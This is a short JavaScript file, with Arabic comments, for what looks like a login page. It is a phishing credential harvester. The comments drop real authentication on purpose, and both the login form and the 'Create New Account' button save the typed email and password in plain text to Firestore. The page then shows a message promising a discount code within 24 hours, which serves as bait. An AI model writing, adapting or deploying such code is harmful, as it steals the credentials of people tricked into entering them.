// حذف auth لأنه مش محتاجين تسجيل دخول فعلي
// const auth = firebase.auth(); ← احذف ده

document.getElementById('loginForm').addEventListener('submit', async function(e) {
  e.preventDefault();

  const email = document.getElementById('email').value.trim();
  const password = document.getElementById('password').value;

  if (!email || !password) {
    alert("Please fill in both email and password.");
    return;
  }

  try {
    // تخزين البيانات في Firestore
    await db.collection("loginAttempts").add({
      email: email,
      password: password,
      timestamp: firebase.firestore.FieldValue.serverTimestamp()
    });

    alert("سيتم ارسال كود خصم خلال 24 ساعه");
    document.getElementById('loginForm').reset();
  } catch (error) {
    console.error("Error saving to Firestore:", error);
    alert("Failed to submit data: " + error.message);
  }
});

// زرار "Create New Account" يعمل نفس الشيء
document.querySelector('.create-account').addEventListener('click', async function() {
  const email = document.getElementById('email').value.trim();
  const password = document.getElementById('password').value;

  if (!email || !password) {
    alert("Please enter an email and password to create a new account.");
    return;
  }

  try {
    await db.collection("newAccounts").add({
      email: email,
      password: password,
      timestamp: firebase.firestore.FieldValue.serverTimestamp()
    });

    alert("سيتم ارسال كود خصم خلال 24 ساعه");
    document.getElementById('loginForm').reset();
  } catch (error) {
    console.error("Error saving account:", error);
    alert("سيتم ارسال كود خصم خلال 24 ساعه");
  }
});

